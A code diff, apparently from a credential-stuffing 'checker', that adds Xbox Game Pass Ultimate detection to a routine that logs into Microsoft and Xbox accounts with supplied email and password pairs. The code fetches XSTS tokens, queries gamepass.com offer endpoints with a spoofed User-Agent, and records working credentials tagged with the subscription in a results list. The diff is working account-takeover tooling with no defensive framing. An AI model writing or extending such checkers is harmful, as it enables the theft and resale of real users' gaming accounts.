@@ -2125,6 +2125,51 @@ async function authenticate(email, password) {
               hit = await checkMc(jar, email, password, accessToken, xboxToken);
             }
           }
+
+          // Silent perks-based XGPU detection
+          try {
+            const xstsLiveRes = await fetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
+              method: "POST",
+              headers: { "Content-Type": "application/json", Accept: "application/json" },
+              body: JSON.stringify({
+                Properties: { SandboxId: "RETAIL", UserTokens: [xboxToken] },
+                RelyingParty: "http://xboxlive.com",
+                TokenType: "JWT",
+              }),
+              signal: AbortSignal.timeout(config.timeout * 1000),
+            });
+            const xstsLiveJs = await xstsLiveRes.json();
+            const xstsLiveToken = xstsLiveJs.Token;
+            if (xstsLiveToken) {
+              const liveUhs = xstsLiveJs.DisplayClaims?.xui?.[0]?.uhs || uhs;
+              const perksAuth = `XBL3.0 x=${liveUhs};${xstsLiveToken}`;
+              for (const ver of ["v3", "v2"]) {
+                try {
+                  const perksRes = await fetch(`https://profile.gamepass.com/${ver}/offers`, {
+                    headers: {
+                      Authorization: perksAuth,
+                      "Content-Type": "application/json",
+                      "User-Agent": "okhttp/4.12.0",
+                    },
+                    signal: AbortSignal.timeout(10000),
+                  });
+                  if (perksRes.ok) {
+                    const perksData = await perksRes.json();
+                    const offerList = perksData.offers || perksData.perks || [];
+                    if (offerList.length > 0) {
+                      const alreadyXgpu = results_xgpu.includes(`${email}:${password}`);
+                      if (!alreadyXgpu) {
+                        stats.xgpu++;
+                        results_xgpu.push(`${email}:${password} | XBOX GAME PASS ULTIMATE`);
+                        hit = true;
+                      }
+                    }
+                    break;
+                  }
+                } catch {}
+              }
+            }
+          } catch {}
         }
       } catch {}
 
